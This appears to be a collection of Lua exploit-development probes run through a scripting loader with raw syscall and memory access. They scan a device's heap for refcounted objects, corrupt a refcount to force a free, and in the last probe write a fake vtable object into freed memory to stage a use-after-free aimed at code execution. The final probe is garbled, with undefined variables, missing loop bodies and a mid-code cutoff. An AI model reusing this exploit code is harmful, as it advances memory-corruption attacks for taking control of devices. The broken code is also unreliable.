    print("  " .. s)
end

print("")
print("--- LINKED LISTS (heap+heap): " .. #list_nodes .. " ---")
for j, s in ipairs(list_nodes) do
    if j > 16 then print("  ..." .. (#list_nodes - 16) .. " more"); break end
    print("  " .. s)
end

print("")
print("--- REFCOUNT+PTR: " .. #rc_ptrs .. " ---")
for j, s in ipairs(rc_ptrs) do
    if j > 16 then print("  ..." .. (#rc_ptrs - 16) .. " more"); break end
    print("  " .. s)
end

print("")

--------------------------------------------------------------------
-- Pass 3: Dereference up to 8 text pointers to verify they're code
--------------------------------------------------------------------
print("--- PASS 3: DEREFERENCE TEXT PTRS ---")
do
    local tested = 0
    for _, pg in ipairs(nz_pages) do
        if tested >= 8 then break end
        for off = 0, 0xF00, 0x100 do
            if tested >= 8 then break end
            local q = safe_rq(pg + off)
            if q then
                local h, l = get_hi_lo(q)
                if h == 0 and l >= 0x80000000 and l < 0x90000000 then
                    local dw = safe_rd(l)
                    if dw then
                        local b0 = dw % 256
                        local tag = "?"
                        if b0 == 0x55 or b0 == 0x48 or b0 == 0x41 or
                           b0 == 0xE8 or b0 == 0xE9 or b0 == 0xCC or
                           b0 == 0xC3 or b0 == 0x53 or b0 == 0x57 or
                           b0 == 0x89 or b0 == 0x8B or b0 == 0x4C or
                           b0 == 0x50 or b0 == 0x56 then
                            tag = "CODE"
                        else
                            tag = "DATA"
                        end
                        print(string.format("  *0x%X -> dword=%s b0=%02X [%s]", l, hex(dw), b0, tag))
                        tested = tested + 1
                    else
                        print(string.format("  *0x%X -> FAULT", l))
                        tested = tested + 1
                    end
                end
            end
        end
    end
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41g COMPLETE ===")
```

## probes/phase7_heap_exploitation/41h_refcount_corrupt.lua

```lua
-- CRASH_CLASS: RISKY (intentional heap corruption)
-- PROBE 41h: refcount corruption test
-- From 41g: 24 refcount+ptr pairs, all rc=4, uniform slab at +0xBC0/CC0 offsets
-- Plan:
--   1. Locate a refcount=4 pair in adjacent heap
--   2. Snapshot the surrounding 128 bytes (for forensics)
--   3. Corrupt refcount: 4 -> 0
--   4. Trigger allocator activity (mmap/munmap churn)
--   5. Re-read the object: did it get freed/zeroed/reallocated?
--   6. If freed: write fake object, trigger use -> code execution
-- NOTE: this WILL likely crash the loader. We capture output before the crash.

print("=== PROBE 41h: REFCOUNT CORRUPTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then
        return val.h, val.l
    end
    return 0, to_num(val)
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

--------------------------------------------------------------------
-- Step 1: Allocate anchor, find refcount target
--------------------------------------------------------------------
local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    return
end
print("anchor: " .. hex(base))

-- Find first refcount=4 + heap_ptr pair
local target_addr = nil
local target_rc_addr = nil
local target_ptr_addr = nil

for i = 1, 256 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    if v == 0 then
        -- skip zero pages fast
    else
        for off = 0, 0xF00, 0x100 do
            local a = pg + off
            local q0 = safe_rq(a)
            local q1 = safe_rq(a + 8)
            if q0 and q1 then
                local h0, l0 = get_hi_lo(q0)
                local h1, l1 = get_hi_lo(q1)
                if h0 == 0 and l0 == 4 and h1 == 3 and l1 >= 0x10000000 then
                    target_addr = a
                    target_rc_addr = a
                    target_ptr_addr = a + 8
                    break
                end
            end
        end
    end
    if target_addr then break end
end

if not target_addr then
    print("NO refcount target found")
    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    return
end

print("target: " .. hex(target_addr))
print("")

--------------------------------------------------------------------
-- Step 2: Snapshot 128 bytes around the target
--------------------------------------------------------------------
print("--- SNAPSHOT (before corruption) ---")
local snapshot = {}
local snap_start = target_addr - 0x20
for off = 0, 0x78, 8 do
    local q = safe_rq(snap_start + off)
    if q then
        local rel = off - 0x20
        local tag = ""
        if snap_start + off == target_rc_addr then tag = " <-- REFCOUNT" end
        if snap_start + off == target_ptr_addr then tag = " <-- PTR" end
        local s = string.format("  [%+03X] %s%s", rel, dump_qword(q), tag)
        print(s)
        snapshot[off] = q
    end
end
print("")

-- Also read the object the ptr points to
local ptr_q = safe_rq(target_ptr_addr)
if ptr_q then
    local ph, pl = get_hi_lo(ptr_q)
    -- reconstruct full 64-bit addr: hi=3, lo=pl
    -- But we can only address 32-bit with memory.read_dword
    -- The ptr is 0x3_1xxxxxxx which is >32-bit, need uint64
    print("--- TARGET OBJECT (at ptr) ---")
    local ptr_full = ph * 0x100000000 + pl
    -- try reading via the numeric address
    for off = 0, 0x38, 8 do
        local q = safe_rq(uint64(ptr_full + off))
        if q then
            print(string.format("  [+%02X] %s", off, dump_qword(q)))
        else
            print(string.format("  [+%02X] FAULT", off))
            break
        end
    end
    print("")
end

--------------------------------------------------------------------
-- Step 3: Corrupt refcount 4 -> 0
--------------------------------------------------------------------
print("--- CORRUPTING REFCOUNT ---")
local orig_rc = safe_rd(target_rc_addr)
print("original rc: " .. hex(orig_rc))

local ok_w = safe_wd(target_rc_addr, 0)
if ok_w then
    local new_rc = safe_rd(target_rc_addr)
    print("after write: " .. hex(new_rc))
    if new_rc == 0 then
        print("REFCOUNT ZEROED")
    else
        print("write did not stick!")
    end
else
    print("WRITE FAILED")
    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    return
end
print("")

--------------------------------------------------------------------
-- Step 4: Trigger allocator activity to process the freed object
--------------------------------------------------------------------
print("--- TRIGGERING ALLOCATOR ---")

-- churn: alloc and free pages to kick the allocator
local churn_addrs = {}
for i = 1, 8 do
    local a = do_mmap(PAGE)
    if a then
        churn_addrs[#churn_addrs + 1] = a
        -- write something to force page fault / commit
        safe_wd(a, 0x42424242 + i)
    end
end
print("churn allocs: " .. #churn_addrs)

-- free them
for _, a in ipairs(churn_addrs) do
    pcall(function() sc_munmap(uint64(a), uint64(PAGE)) end)
end
print("churn freed")

-- also trigger some syscalls that might touch the allocator
local sys_pipe = make_syscall(42)  -- pipe
local pipe_buf = memory.alloc(16)
pcall(function() sys_pipe(pipe_buf) end)
local fd0 = safe_rd(pipe_buf)
local fd1 = safe_rd(pipe_buf + 4)
if fd0 and fd0 > 0 then
    local sys_close = make_syscall(6)
    pcall(function() sys_close(fd0) end)
    pcall(function() sys_close(fd1) end)
    print("pipe create+close done")
end

-- socket churn
local sys_socket = make_syscall(97)
local sys_close = make_syscall(6)
for i = 1, 4 do
    local ok_s, fd = pcall(function() return sys_socket(2, 1, 0) end)
    if ok_s then
        local fdn = to_num(fd)
        if fdn > 0 then
            pcall(function() sys_close(fdn) end)
        end
    end
end
print("socket churn done")
print("")

--------------------------------------------------------------------
-- Step 5: Re-read the corrupted object — what happened?
--------------------------------------------------------------------
print("--- POST-CORRUPTION SNAPSHOT ---")
local changed = 0
for off = 0, 0x78, 8 do
    local q = safe_rq(snap_start + off)
    if q then
        local rel = off - 0x20
        local tag = ""
        if snap_start + off == target_rc_addr then tag = " <-- RC" end
        if snap_start + off == target_ptr_addr then tag = " <-- PTR" end

        -- compare to snapshot
        local orig = snapshot[off]
        if orig then
            local oh, ol = get_hi_lo(orig)
            local nh, nl = get_hi_lo(q)
            if oh ~= nh or ol ~= nl then
                tag = tag .. " CHANGED!"
                changed = changed + 1
            end
        end
        print(string.format("  [%+03X] %s%s", rel, dump_qword(q), tag))
    end
end
print("")
print("changed qwords: " .. changed)

if changed > 0 then
    print("*** OBJECT STATE CHANGED AFTER RC CORRUPTION ***")
    -- check if rc is still 0 or was touched
    local final_rc = safe_rd(target_rc_addr)
    print("final rc: " .. hex(final_rc))
    if final_rc ~= 0 then
        print("RC was modified by allocator (possible free+realloc)")
    end
else
    print("object unchanged — free may be deferred or rc not checked yet")
    -- restore to avoid persistent corruption
    print("restoring original rc...")
    safe_wd(target_rc_addr, orig_rc)
    local restored = safe_rd(target_rc_addr)
    print("restored rc: " .. hex(restored))
end

print("")

-- Re-read the target object at the ptr
if ptr_q then
    local ph, pl = get_hi_lo(ptr_q)
    local ptr_full = ph * 0x100000000 + pl
    print("--- TARGET OBJECT (post-corruption) ---")
    for off = 0, 0x38, 8 do
        local q = safe_rq(uint64(ptr_full + off))
        if q then
            print(string.format("  [+%02X] %s", off, dump_qword(q)))
        else
            print(string.format("  [+%02X] FAULT (FREED?)", off))
            break
        end
    end
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41h COMPLETE ===")
```

```lua
-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41i: identify the rc=4 objects
-- From 41h: rc=4 at +0, heap_ptr at +8, cross-ptr at +10, type? at +18,
--   heap_ptr at +20, flags at +28, heap_ptr at +30, list heads at +40/+48
-- Goals:
--   1. Dump ALL rc=4 objects (up to 32), compare structure
--   2. Categorize type tags, flags, list connectivity
--   3. Follow ptr at +8 into target object, dump its header
--   4. Check if target object has vtable-like first qword
--   5. Try to correlate with known syscall objects (EVF, socket, pipe, file)

print("=== PROBE 41i: OBJECT IDENTIFICATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function full_addr(hi, lo)
    return hi * 0x100000000 + lo
end

local base = do_mmap(PAGE)
if not base then print("mmap FAILED"); return end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- PASS 1: Collect all rc=4 objects
--------------------------------------------------------------------
print("--- PASS 1: COLLECT rc=4 OBJECTS ---")

local objects = {}
for i = 1, 384 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    if v ~= 0 then
        for off = 0, 0xF00, 0x40 do
            if #objects >= 32 then break end
            local a = pg + off
            local q0 = safe_rq(a)
            local q1 = safe_rq(a + 8)
            if q0 and q1 then
                local h0, l0 = get_hi_lo(q0)
                local h1, l1 = get_hi_lo(q1)
                if h0 == 0 and l0 == 4 and h1 == 3 and l1 >= 0x10000000 then
                    -- read the full object record (0x60 bytes)
                    local rec = {}
                    rec.addr = a
                    rec.fields = {}
                    for fo = 0, 0x58, 8 do
                        rec.fields[fo] = safe_rq(a + fo)
                    end
                    objects[#objects + 1] = rec
                end
            end
        end
    end
    if #objects >= 32 then break end
end
print("found: " .. #objects .. " objects")
print("")

--------------------------------------------------------------------
-- PASS 2: Extract key fields from each, find common patterns
--------------------------------------------------------------------
print("--- PASS 2: OBJECT FIELD COMPARISON ---")

local type_tags = {}
local flag_vals = {}
local first_qwords = {}

for j, obj in ipairs(objects) do
    -- field layout from 41h:
    -- +00: rc (always 4)
    -- +08: ptr -> target object
    -- +10: cross-ptr
    -- +18: type tag?
    -- +20: heap ptr
    -- +28: flags
    -- +30: heap ptr
    -- +38: zero?
    -- +40: list next
    -- +48: list prev
    -- +50: heap ptr
    -- +58: value?

    local f18 = obj.fields[0x18]
    local f28 = obj.fields[0x28]
    local f08 = obj.fields[0x08]

    local tag = 0
    if f18 then
        local th, tl = get_hi_lo(f18)
        tag = tl
    end

    local flags = 0
    if f28 then
        local fh, fl = get_hi_lo(f28)
        flags = fh * 0x100000000 + fl
    end

    type_tags[tag] = (type_tags[tag] or 0) + 1
    flag_vals[flags] = (flag_vals[flags] or 0) + 1

    -- follow ptr at +08 to target, read first qword (potential vtable)
    local tgt_first = nil
    if f08 then
        local ph, pl = get_hi_lo(f08)
        if ph == 3 and pl >= 0x10000000 then
            local tq = safe_rq(uint64(full_addr(ph, pl)))
            if tq then
                tgt_first = tq
                local th2, tl2 = get_hi_lo(tq)
                local key = string.format("%08X_%08X", th2, tl2)
                first_qwords[key] = (first_qwords[key] or 0) + 1
            end
        end
    end

    if j <= 12 then
        local parts = {}
        parts[#parts + 1] = string.format("tag=0x%X", tag)
        parts[#parts + 1] = string.format("flg=0x%X", flags)
        if tgt_first then
            parts[#parts + 1] = "tgt[0]=" .. dump_qword(tgt_first)
        end
        print(string.format("  #%02d %s: %s", j, hex(obj.addr), table.concat(parts, " ")))
    end
end
if #objects > 12 then
    print("  ... " .. (#objects - 12) .. " more")
end
print("")

--------------------------------------------------------------------
-- PASS 3: Type tag distribution
--------------------------------------------------------------------
print("--- PASS 3: TYPE TAGS ---")
for tag, cnt in pairs(type_tags) do
    print(string.format("  0x%X : %d objects", tag, cnt))
end
print("")

print("--- FLAGS ---")
for fl, cnt in pairs(flag_vals) do
    print(string.format("  0x%X : %d objects", fl, cnt))
end
print("")

print("--- TARGET [0] VALUES (vtable?) ---")
for fq, cnt in pairs(first_qwords) do
    print(string.format("  %s : %d objects", fq, cnt))
end
print("")

--------------------------------------------------------------------
-- PASS 4: Deep dump of one object + its target
--------------------------------------------------------------------
print("--- PASS 4: DEEP DUMP (object #1) ---")
if #objects >= 1 then
    local obj = objects[1]
    print("  container at " .. hex(obj.addr) .. ":")
    for fo = 0, 0x58, 8 do
        local q = obj.fields[fo]
        if q then
            print(string.format("    +%02X: %s", fo, dump_qword(q)))
        end
    end

    -- follow ptr chain
    local f08 = obj.fields[0x08]
    if f08 then
        local ph, pl = get_hi_lo(f08)
        if ph == 3 and pl >= 0x10000000 then
            local tgt = full_addr(ph, pl)
            print("  target at " .. hex(tgt) .. ":")
            for fo = 0, 0x78, 8 do
                local q = safe_rq(uint64(tgt + fo))
                if q then
                    local qh, ql = get_hi_lo(q)
                    local tag = ""
                    if qh >= 0xFFFFFF80 then tag = " KPTR!" end
                    if qh == 0 and ql >= 0x80000000 and ql < 0x90000000 then tag = " TEXT!" end
                    if qh == 3 and ql >= 0x10000000 then tag = " HEAP" end
                    print(string.format("    +%02X: %s%s", fo, dump_qword(q), tag))
                else
                    break
                end
            end
        end
    end

    -- follow the list at +40/+48
    local f40 = obj.fields[0x40]
    if f40 then
        local lh, ll = get_hi_lo(f40)
        if lh == 3 and ll >= 0x10000000 then
            local list_addr = full_addr(lh, ll)
            if list_addr ~= obj.addr + 0x40 then
                print("  list next at " .. hex(list_addr) .. ":")
                for fo = 0, 0x18, 8 do
                    local q = safe_rq(uint64(list_addr + fo))
                    if q then
                        print(string.format("    +%02X: %s", fo, dump_qword(q)))
                    end
                end
            else
                print("  list: self-referential (empty)")
            end
        end
    end
end
print("")

--------------------------------------------------------------------
-- PASS 5: Create known objects, see if new rc=4 appears
--------------------------------------------------------------------
print("--- PASS 5: OBJECT CREATION CORRELATION ---")
do
    -- count rc=4 objects before
    local before_count = #objects

    -- create EVF (known to work, returns ID)
    local sys_evf_create = make_syscall(538)
    local sys_evf_delete = make_syscall(539)
    local name_buf = memory.alloc(32)
    memory.write_byte(name_buf, 0x74) -- t
    memory.write_byte(name_buf + 1, 0x73) -- s
    memory.write_byte(name_buf + 2, 0x74) -- t
    memory.write_byte(name_buf + 3, 0)

    local evf_ids = {}
    for i = 1, 3 do
        local ok_e, ret_e = pcall(function() return sys_evf_create(name_buf, 0x11, memory.alloc(8)) end)
        if ok_e then
            local eid = to_num(ret_e)
            if eid > 0 and eid < 100000 then
                evf_ids[#evf_ids + 1] = eid
            end
        end
    end
    print("  created " .. #evf_ids .. " EVFs: " .. table.concat(evf_ids, ", "))

    -- scan for new rc=4 near our anchor
    local new_rc4 = 0
    for i = 1, 32 do
        local pg = base - i * 0x1000
        if pg <= 0 then break end
        local v = safe_rd(pg)
        if v == nil then break end
        if v ~= 0 then
            for off = 0, 0xF00, 0x40 do
                local a = pg + off
                local q0 = safe_rq(a)
                if q0 then
                    local h0, l0 = get_hi_lo(q0)
                    if h0 == 0 and l0 == 4 then
                        -- check if this is a new one (not in our list)
                        local known = false
                        for _, obj in ipairs(objects) do
                            if obj.addr == a then known = true; break end
                        end
                        if not known then
                            new_rc4 = new_rc4 + 1
                            if new_rc4 <= 4 then
                                local f18 = safe_rq(a + 0x18)
                                local tag = 0
                                if f18 then
                                    local th, tl = get_hi_lo(f18)
                                    tag = tl
                                end
                                print(string.format("  NEW rc=4 at %s tag=0x%X", hex(a), tag))
                            end
                        end
                    end
                end
            end
        end
    end
    print("  new rc=4 objects after EVF create: " .. new_rc4)

    -- cleanup EVFs
    for _, eid in ipairs(evf_ids) do
        pcall(function() sys_evf_delete(eid) end)
    end

    -- now create sockets
    local sys_socket = make_syscall(97)
    local sys_close = make_syscall(6)
    local sock_fds = {}
    for i = 1, 3 do
        local ok_s, fd = pcall(function() return sys_socket(2, 1, 0) end)
        if ok_s then
            local fdn = to_num(fd)
            if fdn > 0 then sock_fds[#sock_fds + 1] = fdn end
        end
    end
    print("  created " .. #sock_fds .. " sockets")

    -- scan again
    local new_sock_rc4 = 0
    for i = 1, 32 do
        local pg = base - i * 0x1000
        if pg <= 0 then break end
        local v = safe_rd(pg)
        if v == nil then break end
        if v ~= 0 then
            for off = 0, 0xF00, 0x40 do
                local a = pg + off
                local q0 = safe_rq(a)
                if q0 then
                    local h0, l0 = get_hi_lo(q0)
                    if h0 == 0 and l0 == 4 then
                        local known = false
                        for _, obj in ipairs(objects) do
                            if obj.addr == a then known = true; break end
                        end
                        if not known then
                            new_sock_rc4 = new_sock_rc4 + 1
                            if new_sock_rc4 <= 4 then
                                local f18 = safe_rq(a + 0x18)
                                local tag = 0
                                if f18 then
                                    local th, tl = get_hi_lo(f18)
                                    tag = tl
                                end
                                print(string.format("  NEW rc=4 at %s tag=0x%X (post-socket)", hex(a), tag))
                            end
                        end
                    end
                end
            end
        end
    end
    print("  new rc=4 after socket create: " .. new_sock_rc4)

    for _, fd in ipairs(sock_fds) do
        pcall(function() sys_close(fd) end)
    end
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41i COMPLETE ===")
```

## probes/phase7_heap_exploitation/41j_uaf_spray.lua

```lua
-- CRASH_CLASS: RISKY (heap spray + UAF trigger)
-- PROBE 41j: exploit dangling pointers to freed targets
-- From 41i: 4 containers have target[0]=0xAFAFAFAF (freed)
-- Plan:
--   1. Find containers with freed targets (AFAF pattern)
--   2. Read the container's ptr at +08 to get the freed target address
--   3. Determine target object size from surrounding metadata
--   4. Spray: allocate many objects of similar size hoping to land on freed addr
--   5. Write controlled data at the freed address if we can reach it
--   6. Try to trigger the container to dereference the target
--      (via close/dup/ioctl-like syscalls)
--   7. Observe: crash = we control PC, no crash = need different trigger

print("=== PROBE 41j: UAF SPRAY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function full_addr(hi, lo)
    return hi * 0x100000000 + lo
end

local base = do_mmap(PAGE)
if not base then print("mmap FAILED"); return end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- STEP 1: Find containers pointing to freed targets
--------------------------------------------------------------------
print("--- STEP 1: FIND DANGLING CONTAINERS ---")

local dangling = {}
for i = 1, 384 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    if v ~= 0 then
        for off = 0, 0xF00, 0x40 do
            if #dangling >= 8 then break end
            local a = pg + off
            local q0 = safe_rq(a)
            local q1 = safe_rq(a + 8)
            if q0 and q1 then
                local h0, l0 = get_hi_lo(q0)
                local h1, l1 = get_hi_lo(q1)
                -- rc=4, heap ptr
                if h0 == 0 and l0 == 4 and h1 == 3 and l1 >= 0x10000000 then
                    local tgt_addr = full_addr(h1, l1)
                    local tgt_q0 = safe_rq(uint64(tgt_addr))
                    if tgt_q0 then
                        local th, tl = get_hi_lo(tgt_q0)
                        if th == 0xAFAFAFAF and tl == 0xAFAFAFAF then
                            -- freed target! dump the container
                            local tag_q = safe_rq(a + 0x18)
                            local tag = 0
                            if tag_q then
                                local _, tl2 = get_hi_lo(tag_q)
                                tag = tl2
                            end
                            dangling[#dangling + 1] = {
                                container = a,
                                target = tgt_addr,
                                tag = tag,
                            }
                        end
                    end
                end
            end
        end
    end
    if #dangling >= 8 then break end
end

print("dangling containers: " .. #dangling)
for j, d in ipairs(dangling) do
    print(string.format("  #%d container=%s target=%s tag=0x%X",
        j, hex(d.container), hex(d.target), d.tag))
end
print("")

if #dangling == 0 then
    print("no dangling targets found this run")
    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    print("=== PROBE 41j COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- STEP 2: Characterize the freed target region
--------------------------------------------------------------------
print("--- STEP 2: FREED TARGET REGION ---")
local victim = dangling[1]
local tgt = victim.target

-- how much of the freed region is 0xAFAF?

for off = 0, 0x1F0, 8 do
    local q = safe_rq(uint64(tgt + off))
    if q then
        local h, l = get_hi_lo(q)
        if h == 0xAFAFAFAF or l == 0xAFAFAFAF then

        else
            break
        end
    else
        break
    end
end
print("  freed extent: " .. hex(afaf_extent) .. " bytes of 0xAFAF")

-- check what's just before and after the freed region
local before_q = safe_rq(uint64(tgt - 8))
if before_q then
    print("  [-08]: " .. dump_qword(before_q) .. " (alloc header?)")
end
local after_q = safe_rq(uint64(tgt + afaf_extent))
if after_q then
    print("  [+" .. string.format("%02X", afaf_extent) .. "]: " .. dump_qword(after_q) .. " (next obj?)")
end
print("")

-- STEP 3: Direct write to freed target
-- We proved adjacent write works — can we write to this specific addr?
--------------------------------------------------------------------
print("--- STEP 3: DIRECT WRITE TEST ---")

-- save original first qword
local orig_first = safe_rq(uint64(tgt))
print("  target[0] before: " .. (orig_first and dump_qword(orig_first) or "UNREADABLE"))

-- try direct write
local ok_w1 = safe_wd(tgt, 0x41414141)
local ok_w2 = safe_wd(tgt + 4, 0x42424242)
local after_first = safe_rq(uint64(tgt))
print("  write result: w1=" .. tostring(ok_w1) .. " w2=" .. tostring(ok_w2))
print("  target[0] after: " .. (after_first and dump_qword(after_first) or "UNREADABLE"))

local write_works = false
if after_first then
    local ah, al = get_hi_lo(after_first)
    if al == 0x41414141 and ah == 0x42424242 then
        print("  *** DIRECT WRITE TO FREED TARGET CONFIRMED ***")
        write_works = true
    end
end

if not write_works then
    -- restore
    if orig_first then
        local oh, ol = get_hi_lo(orig_first)
        safe_wd(tgt, ol)
        safe_wd(tgt + 4, oh)
    end
    print("  direct write failed, restored original")

    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    print("=== PROBE 41j COMPLETE ===")
    return
end
print("")

--------------------------------------------------------------------
-- STEP 4: Write a fake object at the freed target
-- Make it look like a safe object that will survive dereference
-- Mirror the structure of a live target from 41i
--------------------------------------------------------------------
print("--- STEP 4: WRITE FAKE OBJECT ---")

-- From 41i deep dump, a live target object at 0x31087B000 had:
--   +00: 00000001_42621948  (vtable-like)
--   +08: F1AFAFAF_00000008

-- Write marker pattern across the freed object

    {lo = 0xDEAD0001, hi = 0xFACE0001},  -- +00: fake vtable (recognizable)
    {lo = 0x00000008, hi = 0x00000000},    -- +08: size-like
    {lo = 0x00000040, hi = 0x00000000},    -- +10: offset-like
    {lo = 0x00000060, hi = 0x00000000},    -- +18: offset-like
    {lo = 0x00000000, hi = 0x40080000},    -- +20: capability (match live obj)
    {lo = 0x00000003, hi = 0x00000003},    -- +28: match live pattern
    {lo = 0xDEAD0030, hi = 0xFACE0030},  -- +30: marker
    {lo = 0x00000004, hi = 0x00000000},    -- +38: match live

for idx, mv in ipairs(marker_values) do

    safe_wd(tgt + off, mv.lo)
    safe_wd(tgt + off + 4, mv.hi)

-- verify

for off = 0, 0x38, 8 do
    local q = safe_rq(uint64(tgt + off))
    if q then

end
print("")

--------------------------------------------------------------------
-- STEP 5: Also read the container to understand what field it reads
--------------------------------------------------------------------

print("  container at " .. hex(victim.container) .. ":")
for off = 0, 0x58, 8 do
    local q = safe_rq(victim.container + off)
    if q then
        local tag = ""
        if off == 0 then tag = " rc" end
        if off == 8 then tag = " ptr->freed_target" end
        if off == 0x18 then tag = " tag" end

--------------------------------------------------------------------

    local q = safe_rq(uint64(tgt))
    if q then return dump_qword(q) end

    local ok_p = pcall(function() sys_pipe(pb) end)

        local f1 = safe_rd(pb + 4)

    local ok_s, fd = pcall(function() return sys_socket(2, 1, 0) end)
    if ok_s then
```
